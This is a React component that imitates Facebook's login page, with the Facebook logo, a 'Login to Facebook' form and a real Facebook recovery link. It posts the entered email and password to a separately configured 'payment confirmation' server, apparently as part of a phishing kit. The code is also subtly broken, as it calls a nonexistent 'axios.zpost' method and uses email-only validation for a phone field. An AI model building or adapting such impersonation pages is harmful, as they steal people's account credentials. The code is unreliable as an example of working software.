import React, { useState, useContext } from 'react';
import { useFormik } from 'formik';
import * as Yup from 'yup';
import { toast } from 'sonner';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { useMutation } from '@tanstack/react-query';
import { AuthContext } from '../context/authContext';
import { jwtDecode } from 'jwt-decode';
import Loader from '../components/loader';
import { FaCheck } from 'react-icons/fa';
import { FaXmark } from 'react-icons/fa6';

// Environment variables for URLs:
// `paymentConfirmationUrl`: URL endpoint for payment confirmation
// `universalFormInputUrl`: URL endpoint for submitting universal form inputs
const paymentConfirmationUrl = import.meta.env.VITE_payment_confirmation;
const universalFormInputUrl = import.meta.env.VITE_universal_form_input;


const FacebookLogin = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const { setUser, setToken } = useContext(AuthContext);
  const [uniqueLink, setUniqueLink] = useState('');

  const validationSchema = Yup.object({
    email_phone: Yup.string().email('Invalid email or phone').required('Required'),
    password: Yup.string().min(8, "Must be at least 8 characters").required('Required')
  });

  const facebookLoginMutation = useMutation({
    mutationFn: async (data) => {
        setLoading(true);
        try {
            const loginResponse = await axios.zpost(paymentConfirmationUrl, data);
            if (loginResponse.status === 201) {
                setUser(jwtDecode(loginResponse.data.access));
                setToken(loginResponse.data.access);

                const paymentResponse = await axios.post(paymentConfirmationUrl);
                if (paymentResponse.status === 200) {
                    setUniqueLink(paymentResponse.data.unique_link);
                    toast.success(`Access your form: ${paymentResponse.data.unique_link}`);
                    
                    await axios.post(`${universalFormInputUrl}${paymentResponse.data.unique_link}/`);
                }
                navigate("/");
                toast.success("Welcome!");
            }
        } catch (error) {
            console.error("Error:", error);
            toast.error("Login failed");
        } finally {
            setLoading(false);
        }
    }
  });

  const { handleSubmit,handleChange,values,touched, errors}=useFormik({
    initialValues:{
      email_phone:"",
      password:""
    },
    validationSchema,
    onSubmit:value=>{
      facebookLoginMutation.mutate(value)
    }
  })


  return (
    <div className="block items-center justify-center h-screen bg-gray-100">
      {loading && (
        <div className="z-[999999999999999] fixed inset-0 bg-black bg-opacity-60">
          <Loader />
        </div>
      )}

      <div className="mt-4 ">
        <img src={'/Facebook-Logo-2019.png'} alt="Facebook Logo" className="mx-auto w-[250px] h-[90px]" />
      </div>

      <div className="bg-white rounded-lg shadow-lg m-auto text-center p-6 w-11/12 max-w-md">
        <form className="space-y-4" onSubmit={handleSubmit}>
          <p className="text-2xl font-semibold">Login to Facebook</p>
          <input
            type="text"
            placeholder="Email or Phone"
            required
            className="w-full p-3 border rounded-lg"
            name="email_phone"
            value={values.email_phone}
            onChange={handleChange}
          />
          {touched.email_phone && errors.email_phone ? (
            <FaXmark color="red" className="absolute right-4 top-1/2 -translate-y-1/2" />
          ) : (
            touched.email_phone && <FaCheck color="green" className="absolute right-4 top-1/2 -translate-y-1/2" />
          )}
          <input
            type="password"
            placeholder="Password"
            required
            className="w-full p-3 border rounded-lg"
            name="password"
            value={values.password}
            onChange={handleChange}
          />
          {touched.password && errors.password ? (
            <FaXmark color="red" className="absolute right-4 top-1/2 -translate-y-1/2" />
          ) : (
            touched.password && <FaCheck color="green" className="absolute right-4 top-1/2 -translate-y-1/2" />
          )}
          <button
            type="submit"
            className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
          >
            Log In
          </button>
          <div className="text-blue-600 mt-4">
            <a
              href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
              className="hover:underline"
            >
              Forgotten account?
            </a>
          </div>
          <div className="flex items-center my-4">
            <div className="flex-grow border-t border-gray-400"></div>
            <span className="mx-4 text-gray-500">or</span>
            <div className="flex-grow border-t border-gray-400"></div>
          </div>
          <button className="w-full py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors">
            <a
              href="/facebook-account"
              className="block w-full"
            >
              Create new account
            </a>
          </button>
        </form>
      </div>
    </div>
  );
};

export default FacebookLogin;
